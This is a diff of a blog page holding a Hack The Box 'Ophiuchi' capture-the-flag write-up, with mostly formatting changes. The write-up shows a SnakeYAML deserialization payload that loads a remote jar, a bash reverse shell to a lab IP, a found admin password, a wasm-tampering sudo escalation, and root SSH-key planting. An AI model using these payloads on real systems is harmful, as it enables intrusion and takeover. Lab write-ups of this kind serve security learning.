@@ -6,30 +6,32 @@
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <link rel="icon" type="image/png" href="/favicon.png">
   <link rel="stylesheet" type="text/css" href="/css/style.css">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:wght@700&family=Inconsolata&family=Source+Code+Pro&display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.gstatic.com"> 
+  <link
+  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Kanit:wght@600&family=Roboto&family=Electrolize&display=swap&family=Fira+Mono&family=Cousine&display=swapdisplay=swap&family=IBM+Plex+Mono&display=swap&family=Courier+Prime:wght@700&display=swap"
+  rel="stylesheet"> 
+  <link rel="preconnect" href="https://fonts.gstatic.com">
   <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
-  <!--<script src="/dist/mark.min.js" charset="UTF-8"></script>-->
-<title>Hackthebox Ophiuchi - Writeup &mdash; fmash16's blog</title>
+  <script src="/dist/mark.min.js" charset="UTF-8"></script>
+<title>Hackthebox Ophiuchi -
+Writeup &mdash; fmash16's blog</title>
 <meta property="og:title" content="Hackthebox - Ophiuchi Writeup" />
       <meta property="og:description" content="A medium difficulty hackthebox machine, exploited using YAML deserialization vulnerablity for SnakeYAML used in java applications, and modifying wasm file to get root privileges." />
       <meta property="og:type" content="article" />
       <meta property="og:url" content="github" />
-      <meta property="og:image" content="https://fmash16.github.io/img/htb_ophiuchi/card.png" />
+      <meta property="og:image" content="https://fmash16.github.io//img/htb_ophiuchi/card.png" />
 
 </head>
 
-<body>
-<!-- <h1 class=blogtitle>./fmash16's blog </h1> -->
-<pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">
- ___               _   ___   ___ 
-|  _|_____ ___ ___| |_|_  | |  _|
-|  _|     | .'|_ -|   |_| |_| . |
-|_| |_|_|_|__,|___|_|_|_____|___|
-                 u/fmash16's blog</pre>
+<div class=blogtitle><a href="/index.html">fmash16's blog</a></div> 
+<!--<pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">-->
+ <!--___               _   ___   ___ -->
+<!--|  _|_____ ___ ___| |_|_  | |  _|-->
+<!--|  _|     | .'|_ -|   |_| |_| . |-->
+<!--|_| |_|_|_|__,|___|_|_|_____|___|-->
+                 <!--./fmash16's blog</pre>-->
 <nav>
-   <a href="/index.html">home</a>
+   <!--<a href="/index.html">home</a>-->
    <a href="/archive.html">archive</a>
    <a href="mailto:fmash16@gmail.com">mail</a>
    <a href="https://github.com/fmash16">github</a>
@@ -39,45 +41,72 @@
 </nav>
 
 <article>
-<input id="toggle" type="checkbox" checked>
-<label for="toggle">TOC</label>
-<nav class='toc'>
-    <ul>
-    <li><a href="#hackthebox-ophiuchi---writeup">Hackthebox Ophiuchi - Writeup</a></li>
-    <li><a href="#nmap-scan">Nmap Scan</a></li>
-    <li><a href="#enumeration">Enumeration</a>
-    <ul>
-    <li><a href="#port-8080---apache-tomcat-server">Port 8080 - Apache tomcat server</a></li>
-    <li><a href="#snakeyaml-deserialization-exploit">SnakeYAML deserialization exploit</a></li>
-    </ul></li>
-    <li><a href="#privilege-escalation---user">Privilege Escalation - User</a></li>
-    <li><a href="#privilege-escalation---root">Privilege Escalation - root</a></li>
-    </ul>
-</nav>
-<h1 id="hackthebox-ophiuchi---writeup">Hackthebox Ophiuchi - Writeup</h1>
-<p>This is a medium difficulty hackthebox machine, exploited using YAML deserialization vulnerablity for SnakeYAML used in java applications, and modifying wasm file to get root privileges.</p>
+<ul>
+<li><a href="#hackthebox-ophiuchi---writeup">Hackthebox Ophiuchi -
+Writeup</a></li>
+<li><a href="#nmap-scan">Nmap Scan</a></li>
+<li><a href="#enumeration">Enumeration</a>
+<ul>
+<li><a href="#port-8080---apache-tomcat-server">Port 8080 - Apache
+tomcat server</a></li>
+<li><a href="#snakeyaml-deserialization-exploit">SnakeYAML
+deserialization exploit</a></li>
+</ul></li>
+<li><a href="#privilege-escalation---user">Privilege Escalation -
+User</a></li>
+<li><a href="#privilege-escalation---root">Privilege Escalation -
+root</a></li>
+</ul>
+<h1 id="hackthebox-ophiuchi---writeup">Hackthebox Ophiuchi -
+Writeup</h1>
+<p>This is a medium difficulty hackthebox machine, exploited using YAML
+deserialization vulnerablity for SnakeYAML used in java applications,
+and modifying wasm file to get root privileges.</p>
 <p>We write the IP of the machine to our /etc/hosts file</p>
-<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;10.10.10.227 ophiuchi.htb&quot;</span> <span class="op">&gt;&gt;</span> /etc/hosts</span></code></pre></div>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;10.10.10.227 ophiuchi.htb&quot;</span> <span class="op">&gt;&gt;</span> /etc/hosts</span></code></pre></div>
 <h1 id="nmap-scan">Nmap Scan</h1>
 <p>Open ports:</p>
 <ul>
-<li>22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br />
+<li>22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux;
+protocol 2.0)<br />
 </li>
 <li>8080/tcp open http Apache Tomcat 9.0.38</li>
 </ul>
 <h1 id="enumeration">Enumeration</h1>
-<h2 id="port-8080---apache-tomcat-server">Port 8080 - Apache tomcat server</h2>
-<p>Going over to the page, we find a YAML parser. YAML is a human-readable data-serialization language. It is commonly used for configuration files and in applications where data is being stored or transmitted.</p>
-<p>So lets check if we can exploit it using deserialization vulnerability. Googling for a bit, we find that <strong>SnakeYAML</strong> which is used in Java applications is vulnerable to deserialization. Found a really good medium blog by Swapneil Kumar Dash <a href="https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858">here.</a></p>
-<p>We can use this deserialization vulnerablity to get remote code execution. The original paper is to be found at <a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a> And the YAML payload we are going to use is found at <a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
-<h2 id="snakeyaml-deserialization-exploit">SnakeYAML deserialization exploit</h2>
-<p>We clone the repo and edit AwesomeScriptEngineFactory.java file to execute are desired commands.</p>
-<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/artsploit/yaml-payload</span></code></pre></div>
-<p>We can execute system commands useing the <code>Runtime.getRuntime().exec()</code>. We write a bash script revshell.sh as follows</p>
+<h2 id="port-8080---apache-tomcat-server">Port 8080 - Apache tomcat
+server</h2>
+<p>Going over to the page, we find a YAML parser. YAML is a
+human-readable data-serialization language. It is commonly used for
+configuration files and in applications where data is being stored or
+transmitted.</p>
+<p>So lets check if we can exploit it using deserialization
+vulnerability. Googling for a bit, we find that
+<strong>SnakeYAML</strong> which is used in Java applications is
+vulnerable to deserialization. Found a really good medium blog by
+Swapneil Kumar Dash <a
+href="https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858">here.</a></p>
+<p>We can use this deserialization vulnerablity to get remote code
+execution. The original paper is to be found at <a
+href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a>
+And the YAML payload we are going to use is found at <a
+href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
+<h2 id="snakeyaml-deserialization-exploit">SnakeYAML deserialization
+exploit</h2>
+<p>We clone the repo and edit AwesomeScriptEngineFactory.java file to
+execute are desired commands.</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/artsploit/yaml-payload</span></code></pre></div>
+<p>We can execute system commands useing the
+<code>Runtime.getRuntime().exec()</code>. We write a bash script
+revshell.sh as follows</p>
 <div class="sourceCode" id="cb3"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/sh</span></span>
 <span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="fu">bash</span> <span class="at">-i</span> <span class="op">&gt;&amp;</span> /dev/tcp/10.10.14.6/8888 <span class="dv">0</span><span class="op">&gt;&amp;</span><span class="dv">1</span></span></code></pre></div>
-<p>Next we insert the commands to be executed on target machine. We use <code>curl</code> to get the revshell.sh from our machine and execute it.</p>
-<div class="sourceCode" id="cb4"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">package</span><span class="im"> artsploit</span><span class="op">;</span></span>
+<p>Next we insert the commands to be executed on target machine. We use
+<code>curl</code> to get the revshell.sh from our machine and execute
+it.</p>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode java"><code class="sourceCode java"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">package</span><span class="im"> artsploit</span><span class="op">;</span></span>
 <span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">javax</span><span class="op">.</span><span class="im">script</span><span class="op">.</span><span class="im">ScriptEngine</span><span class="op">;</span></span>
 <span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">javax</span><span class="op">.</span><span class="im">script</span><span class="op">.</span><span class="im">ScriptEngineFactory</span><span class="op">;</span></span>
@@ -97,34 +126,50 @@
 <span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>  <span class="kw">...</span></span>
 <span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a>  <span class="kw">...</span></span></code></pre></div>
-<p>Now as per the instructions, we use the following commands to get our payload jar file</p>
-<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> yaml-payload</span>
+<p>Now as per the instructions, we use the following commands to get our
+payload jar file</p>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> yaml-payload</span>
 <span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="ex">javac</span> src/artsploit/AwesomeScriptEngineFactory.java</span>
 <span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="ex">jar</span> <span class="at">-cvf</span> yaml-payload.jar <span class="at">-C</span> src/ .</span></code></pre></div>
-<p>Now, we have our payload jar file. We start a python web server at port 80 and insert the following YAML into the parser to get RCE. We also open a nc listener at port 8888 to get our reverse shell.</p>
-<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> <span class="at">-m</span> http.server 80</span></code></pre></div>
-<div class="sourceCode" id="cb7"><pre class="sourceCode yaml"><code class="sourceCode yaml"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ot">!!javax.script.ScriptEngineManager</span><span class="at"> </span><span class="kw">[</span></span>
+<p>Now, we have our payload jar file. We start a python web server at
+port 80 and insert the following YAML into the parser to get RCE. We
+also open a nc listener at port 8888 to get our reverse shell.</p>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> <span class="at">-m</span> http.server 80</span></code></pre></div>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode yaml"><code class="sourceCode yaml"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ot">!!javax.script.ScriptEngineManager</span><span class="at"> </span><span class="kw">[</span></span>
 <span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="at">  </span><span class="ot">!!java.net.URLClassLoader</span><span class="at"> </span><span class="kw">[[</span></span>
 <span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="at">    </span><span class="ot">!!java.net.URL</span><span class="at"> </span><span class="kw">[</span><span class="st">&quot;http://10.10.14.6/yaml-payload.jar&quot;</span><span class="kw">]</span></span>
 <span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="at">  </span><span class="kw">]]</span></span>
 <span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="kw">]</span></span></code></pre></div>
 <p>We can now get our reverse shell as user <code>tomcat</code>.</p>
 <h1 id="privilege-escalation---user">Privilege Escalation - User</h1>
-<p>Going to the <code>home</code> directory, we find a user named <code>admin</code>.</p>
-<p>Browsing around, we find the user creds in the file <code>/opt/tomcat/conf/tomcat-users.xsd</code>. We find the following in the file</p>
-<div class="sourceCode" id="cb8"><pre class="sourceCode xsd"><code class="sourceCode xml"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;user</span><span class="ot"> username=</span><span class="st">&quot;admin&quot;</span><span class="ot"> password=</span><span class="st">&quot;whythereisalimit&quot;</span><span class="ot"> roles=</span><span class="st">&quot;manager-gui,admin-gui&quot;</span><span class="kw">/&gt;</span></span></code></pre></div>
+<p>Going to the <code>home</code> directory, we find a user named
+<code>admin</code>.</p>
+<p>Browsing around, we find the user creds in the file
+<code>/opt/tomcat/conf/tomcat-users.xsd</code>. We find the following in
+the file</p>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode xsd"><code class="sourceCode xml"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">user</span><span class="ot"> username=</span><span class="st">&quot;admin&quot;</span><span class="ot"> password=</span><span class="st">&quot;whythereisalimit&quot;</span><span class="ot"> roles=</span><span class="st">&quot;manager-gui,admin-gui&quot;</span>/&gt;</span></code></pre></div>
 <p>Creds found:</p>
 <blockquote>
 <p>User: admin<br />
 Password: whythereisalimit</p>
 </blockquote>
-<p>We can now ssh into the machine as suer admin using the obtained creds.</p>
+<p>We can now ssh into the machine as suer admin using the obtained
+creds.</p>
 <h1 id="privilege-escalation---root">Privilege Escalation - root</h1>
-<p>First, we check what sudo capabilities our user admin got using <code>sudo -l</code>.</p>
+<p>First, we check what sudo capabilities our user admin got using
+<code>sudo -l</code>.</p>
 <p>We find the following</p>
-<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">ALL</span><span class="kw">)</span> <span class="ex">NOPASSWD:</span> /usr/bin/go run /opt/wasm-functions/index.go</span></code></pre></div>
-<p>So we can run <code>/usr/bin/go run /opt/wasm-functions/index.go</code> with root privileges. Let’s check out the file. We get the following</p>
-<div class="sourceCode" id="cb10"><pre class="sourceCode go"><code class="sourceCode go"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="kw">package</span> main</span>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">ALL</span><span class="kw">)</span> <span class="ex">NOPASSWD:</span> /usr/bin/go run /opt/wasm-functions/index.go</span></code></pre></div>
+<p>So we can run
+<code>/usr/bin/go run /opt/wasm-functions/index.go</code> with root
+privileges. Let’s check out the file. We get the following</p>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode go"><code class="sourceCode go"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="kw">package</span> main</span>
 <span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="op">(</span></span>
 <span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;fmt&quot;</span></span>
@@ -153,30 +198,56 @@ Password: whythereisalimit</p>
 <span id="cb10-27"><a href="#cb10-27" aria-hidden="true" tabindex="-1"></a>                fmt<span class="op">.</span>Println<span class="op">(</span><span class="dt">string</span><span class="op">(</span>out<span class="op">))</span></span>
 <span id="cb10-28"><a href="#cb10-28" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
 <span id="cb10-29"><a href="#cb10-29" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
-<p>Here, we see that, functions and variables ar imported from the <code>main.wasm</code> file and checking the value of the varibale <code>f</code>, if it equals <code>1</code>, we get ready to deploy and execute <code>/bin/sh deploy.sh</code>.</p>
-<p>What’s notable here is that absolute path is not used for <code>main.wasm</code> and the <code>deploy.sh</code> files. So we can manipulate these. These files will be read from our current working directory, from where we run the <code>index.go</code> file.</p>
-<p>We make our working directory in <code>tmp</code> and copy over the <code>main.wasm</code> file.</p>
-<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> tmp</span>
+<p>Here, we see that, functions and variables ar imported from the
+<code>main.wasm</code> file and checking the value of the varibale
+<code>f</code>, if it equals <code>1</code>, we get ready to deploy and
+execute <code>/bin/sh deploy.sh</code>.</p>
+<p>What’s notable here is that absolute path is not used for
+<code>main.wasm</code> and the <code>deploy.sh</code> files. So we can
+manipulate these. These files will be read from our current working
+directory, from where we run the <code>index.go</code> file.</p>
+<p>We make our working directory in <code>tmp</code> and copy over the
+<code>main.wasm</code> file.</p>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> tmp</span>
 <span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> work <span class="kw">&amp;&amp;</span> <span class="bu">cd</span> work</span>
 <span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> /opt/wasm-functions/main.wasm ./</span></code></pre></div>
-<p>We write our own deploy.sh file that echos out the <code>id</code> of the user.</p>
-<div class="sourceCode" id="cb12"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/sh</span></span>
+<p>We write our own deploy.sh file that echos out the <code>id</code> of
+the user.</p>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/sh</span></span>
 <span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="va">$(</span><span class="fu">id</span><span class="va">)</span></span></code></pre></div>
 <p>Now, we run the following as sudo</p>
-<div class="sourceCode" id="cb13"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> /usr/bin/go run /opt/wasm-functions/index.go</span></code></pre></div>
-<p>We get the error <code>Not ready to deploy</code>. So the value of <code>f</code> is not <code>1</code>, which is read from the wasm file.</p>
-<p>Wasm is short for WebAssembly. WebAssembly is an open standard that defines a portable binary-code format for executable programs, and a corresponding textual assembly language, as well as interfaces for facilitating interactions between such programs and their host environment.</p>
-<p>The text readable format of WASM binary is WAT(Web Assembly Text). We can manipulate the value of <code>f</code> editing the wasm file in this format.</p>
-<p>We install the toolsuit <a href="https://github.com/webassembly/wabt">https://github.com/webassembly/wabt</a> We have 2 binaries <code>wasm2wat</code> and <code>wat2wasm</code> that we can use.</p>
-<p>We transfer the main.wasm file from the target machine to our local machine using nc</p>
-<div class="sourceCode" id="cb14"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> main.wasm <span class="kw">|</span> <span class="ex">nc</span> {your-ip} {your-port}   <span class="er">(</span><span class="ex">on</span> target<span class="kw">)</span></span>
+<div class="sourceCode" id="cb13"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> /usr/bin/go run /opt/wasm-functions/index.go</span></code></pre></div>
+<p>We get the error <code>Not ready to deploy</code>. So the value of
+<code>f</code> is not <code>1</code>, which is read from the wasm
+file.</p>
+<p>Wasm is short for WebAssembly. WebAssembly is an open standard that
+defines a portable binary-code format for executable programs, and a
+corresponding textual assembly language, as well as interfaces for
+facilitating interactions between such programs and their host
+environment.</p>
+<p>The text readable format of WASM binary is WAT(Web Assembly Text). We
+can manipulate the value of <code>f</code> editing the wasm file in this
+format.</p>
+<p>We install the toolsuit <a
+href="https://github.com/webassembly/wabt">https://github.com/webassembly/wabt</a>
+We have 2 binaries <code>wasm2wat</code> and <code>wat2wasm</code> that
+we can use.</p>
+<p>We transfer the main.wasm file from the target machine to our local
+machine using nc</p>
+<div class="sourceCode" id="cb14"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> main.wasm <span class="kw">|</span> <span class="ex">nc</span> {your-ip} {your-port}   <span class="er">(</span><span class="ex">on</span> target<span class="kw">)</span></span>
 <span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lnvp</span> {your-port} <span class="op">&gt;</span> main.wasm           <span class="er">(</span><span class="ex">on</span> local<span class="kw">)</span></span></code></pre></div>
 <p>We convert the wasm to wat and get the following</p>
-<div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">wasm2wat</span> main.wasm <span class="op">&gt;</span> main.wat</span>
+<div class="sourceCode" id="cb15"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">wasm2wat</span> main.wasm <span class="op">&gt;</span> main.wat</span>
 <span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> main.wat</span></code></pre></div>
-<div class="sourceCode" id="cb16"><pre class="sourceCode txt"><code class="sourceCode default"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a>(module</span>
+<div class="sourceCode" id="cb16"><pre
+class="sourceCode txt"><code class="sourceCode default"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a>(module</span>
 <span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>  (type (;0;) (func (result i32)))</span>
 <span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>  (func $info (type 0) (result i32)</span>
 <span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a>    i32.const 0)      &lt;=======================================</span>
@@ -189,17 +260,27 @@ Password: whythereisalimit</p>
 <span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a>  (export &quot;info&quot; (func $info))</span>
 <span id="cb16-12"><a href="#cb16-12" aria-hidden="true" tabindex="-1"></a>  (export &quot;__data_end&quot; (global 1))</span>
 <span id="cb16-13"><a href="#cb16-13" aria-hidden="true" tabindex="-1"></a>  (export &quot;__heap_base&quot; (global 2)))</span></code></pre></div>
-<p>Here we see that the value of f is a constant <code>0</code>, we change that to <code>1</code>, our required value.</p>
-<div class="sourceCode" id="cb17"><pre class="sourceCode txt"><code class="sourceCode default"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a>[-]    i32.const 0)</span>
+<p>Here we see that the value of f is a constant <code>0</code>, we
+change that to <code>1</code>, our required value.</p>
+<div class="sourceCode" id="cb17"><pre
+class="sourceCode txt"><code class="sourceCode default"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a>[-]    i32.const 0)</span>
 <span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>[+]    i32.const 1)</span></code></pre></div>
-<p>Now we conver the wat back to nasm and move it to our target machine working directory.</p>
-<div class="sourceCode" id="cb18"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="ex">wat2wasm</span> main.wat</span>
+<p>Now we conver the wat back to nasm and move it to our target machine
+working directory.</p>
+<div class="sourceCode" id="cb18"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="ex">wat2wasm</span> main.wat</span>
 <span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="fu">scp</span> main.wasm admin@ophiuchi.htb:/tmp/work</span></code></pre></div>
-<p>Now, we run the sudo command again. And this time we get command execution as root</p>
-<div class="sourceCode" id="cb19"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="ex">Ready</span> to deploy</span>
+<p>Now, we run the sudo command again. And this time we get command
+execution as root</p>
+<div class="sourceCode" id="cb19"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="ex">Ready</span> to deploy</span>
 <span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span></span></code></pre></div>
-<p>We get our <code>id_rsa.pub</code> using <code>ssh-keygen</code> and paste it to the <code>authorized_keys</code> file at <code>/root/.ssh/</code> using the <code>deploy.sh</code> fileto be able to SSH into the machine as root.</p>
-<div class="sourceCode" id="cb20"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/sh</span></span>
+<p>We get our <code>id_rsa.pub</code> using <code>ssh-keygen</code> and
+paste it to the <code>authorized_keys</code> file at
+<code>/root/.ssh/</code> using the <code>deploy.sh</code> fileto be able
+to SSH into the machine as root.</p>
+<div class="sourceCode" id="cb20"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/sh</span></span>
 <span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="va">$(</span><span class="fu">id</span><span class="va">)</span></span>
 <span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABA***********************************************************************************************************************************************</span></span>
@@ -207,7 +288,8 @@ Password: whythereisalimit</p>
 <span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a><span class="st">*********************************************************************************************************************************************************************************7BLa+Y</span></span>
 <span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a><span class="st">zHy+9fuMs= root@kali&quot;</span> <span class="op">&gt;&gt;</span> /root/.ssh/authorized_keys</span></code></pre></div>
 <p>Now we can ssh into root and get our root.txt file</p>
-<div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> root@ophiuchi.htb</span>
+<div class="sourceCode" id="cb21"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> root@ophiuchi.htb</span>
 <span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> root.txt</span></code></pre></div>
 </article>
 
